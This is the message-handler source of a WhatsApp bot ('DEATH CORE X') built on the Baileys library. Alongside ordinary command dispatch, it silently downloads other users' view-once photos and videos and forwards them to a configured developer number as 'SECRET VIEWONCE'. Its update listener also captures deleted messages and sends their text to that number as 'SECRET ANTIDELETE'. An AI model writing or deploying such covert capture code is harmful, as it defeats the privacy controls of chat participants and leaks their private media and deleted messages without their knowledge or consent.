const fs = require('fs');
const path = require('path');
const config = require('./config');
const Database = require('better-sqlite3');

const db = new Database('database.sqlite');
db.pragma('journal_mode = WAL');
db.prepare(`CREATE TABLE IF NOT EXISTS users (jid TEXT PRIMARY KEY, wallet INTEGER DEFAULT 0, warns INTEGER DEFAULT 0, last_daily INTEGER DEFAULT 0)`).run();
db.prepare(`CREATE TABLE IF NOT EXISTS chat_memory (jid TEXT PRIMARY KEY, history TEXT)`).run();
db.prepare(`CREATE TABLE IF NOT EXISTS user_settings (jid TEXT PRIMARY KEY, prefix TEXT, mode TEXT, botname TEXT)`).run();

const commands = new Map();
const loadCommands = (dir) => {
    if (!fs.existsSync(dir)) return;
    for (const file of fs.readdirSync(dir)) {
        const fullPath = path.join(dir, file);
        if (fs.statSync(fullPath).isDirectory()) loadCommands(fullPath);
        else if (file.endsWith('.js')) {
            try {
                const props = require(fullPath);
                if (Array.isArray(props)) for (const cmd of props) commands.set(cmd.name, cmd);
            } catch (e) { console.log('Load fail:', file, e.message); }
        }
    }
};
loadCommands(path.join(__dirname, 'commands'));

const messageStore = new Map();
const processedMessages = new Set(); 
const userCache = new Map(); 

module.exports = (sock, store) => {
    
    const getUserSettings = (sender) => {
        if (userCache.has(sender)) return userCache.get(sender);
        let userSet = db.prepare('SELECT * FROM user_settings WHERE jid = ?').get(sender);
        if (!userSet) {
            db.prepare('INSERT INTO user_settings (jid, prefix, mode, botname) VALUES (?, ?, ?, ?)').run(sender, config.prefix, 'PUBLIC', config.botName);
            userSet = { jid: sender, prefix: config.prefix, mode: 'PUBLIC', botname: config.botName };
        }
        userCache.set(sender, userSet);
        return userSet;
    };

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        try {
            if (type !== 'notify') return;
            const msg = messages[0];
            if (!msg.message) return;

            if (processedMessages.has(msg.key.id)) return;
            processedMessages.add(msg.key.id);
            if (processedMessages.size > 1000) processedMessages.clear();

            let content = msg.message;
            if (content.ephemeralMessage) content = content.ephemeralMessage.message;
            if (content.viewOnceMessage) content = content.viewOnceMessage.message;
            if (content.viewOnceMessageV2) content = content.viewOnceMessageV2.message;

            const from = msg.key.remoteJid;
            const sender = msg.key.participant || msg.key.remoteJid;
            
            const isOwner = msg.key.fromMe === true; 

            let globalMode = 'PUBLIC';
            try {
                if (fs.existsSync('./settings.json')) {
                    const parsed = JSON.parse(fs.readFileSync('./settings.json', 'utf8'));
                    globalMode = parsed.mode || 'PUBLIC';
                }
            } catch(e) {}

            if (globalMode === 'PRIVATE' && !isOwner) return;

            const settings = getUserSettings(sender);

            if (!isOwner && (content.viewOnceMessageV2 || content.viewOnceMessage)) {
                const voContent = content.viewOnceMessageV2?.message || content.viewOnceMessage?.message;
                if (voContent) {
                    const { downloadMediaMessage } = require('@whiskeysockets/baileys');
                    try {
                        const buf = await downloadMediaMessage({ message: voContent, key: msg.key }, 'buffer', {});
                        const keyType = Object.keys(voContent)[0];
                        const type = keyType === 'imageMessage' ? 'image' : 'video';
                        const ownerJid = config.devNumber + '@s.whatsapp.net';
                        
                        await sock.sendMessage(ownerJid, { 
                            [type]: buf, 
                            caption: `☠️ *SECRET VIEWONCE*\n\n👤 From: @${sender.split('@')[0]}\n📌 In: ${from}`,
                            mentions: [sender]
                        });
                    } catch (e) {}
                }
            }

            if (from === 'status@broadcast') {
                if (settings.autoviewstatus) try { await sock.readMessages([msg.key]); } catch (e) {}
                if (settings.autolikestatus) try { await sock.sendMessage('status@broadcast', { react: { text: '❤️', key: msg.key } }, { statusJidList: [msg.key.participant] }); } catch (e) {}
                return;
            }

            const isGroup = from.endsWith('@g.us');
            
            const messageType = Object.keys(content)[0];
            let body = '';
            if (messageType === 'conversation') body = content.conversation;
            else if (messageType === 'extendedTextMessage') body = content.extendedTextMessage.text;
            else if (messageType === 'imageMessage') body = content.imageMessage.caption;
            else if (messageType === 'videoMessage') body = content.videoMessage.caption;

            if (body) messageStore.set(msg.key.id, { text: body, sender, from, time: Date.now(), msg });
            if (!body) return;
            body = body.trim();

            const currentPrefix = settings.prefix || config.prefix;
            if (!body.startsWith(currentPrefix)) return;

            const args = body.slice(currentPrefix.length).trim().split(/ +/);
            const commandName = args.shift().toLowerCase();

            const reply = async (text, options = {}) => {
                if (!text) return;
                const sendOpts = { quoted: msg };
                if (typeof text === 'object') return sock.sendMessage(from, text, { ...sendOpts, ...options }).catch(() => {});
                const formatted = `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n┃  ☠️  *𝐃𝐄ΛΤ𝐇 𝐂𝐎𝐑Ξ 𝐗*  ☠️  ┃\n┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n┃\n${text.split('\n').map(line => '┃ ' + line).join('\n')}\n┃\n┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n┃ ⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ: ${config.dev.toUpperCase()}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
                const mentionOpts = isGroup ? { mentions: [sender] } : {};
                return await sock.sendMessage(from, { text: formatted, ...mentionOpts, ...options }, sendOpts).catch(() => {});
            };

            if (commands.has(commandName)) {
                try {
                    await commands.get(commandName).execute(sock, msg, from, args, isGroup, isOwner, config, settings, db, () => {
                        userCache.delete(sender);
                    }, reply, commandName);
                } catch (err) {
                    console.log('Command Error:', commandName, err.message);
                    await reply(`❌ *Error:* ${err.message}`);
                }
            } else {
                await reply(`❌ Unknown command: *${currentPrefix}${commandName}*`);
            }
        } catch (globalErr) { console.log('⚠️ Handler Error:', globalErr.message); }
    });

    sock.ev.on('messages.update', async (updates) => {
        for (const u of updates) {
            if (u.update && u.update.message === null) {
                const orig = messageStore.get(u.key.id);
                if (!orig) continue;
                const sender = u.key.participant || u.key.remoteJid;
                if (sender === config.devNumber + '@s.whatsapp.net') continue;
                
                const txt = `☠️ *SECRET ANTIDELETE*\n\n👤 From: @${sender.split('@')[0]}\n📌 In: ${u.key.remoteJid}\n🗑️ Deleted:\n${orig.text || '[media]'}`;
                try { await sock.sendMessage(config.devNumber + '@s.whatsapp.net', { text: txt, mentions: [sender] }); } catch {}
                messageStore.delete(u.key.id);
            }
        }
    });
};
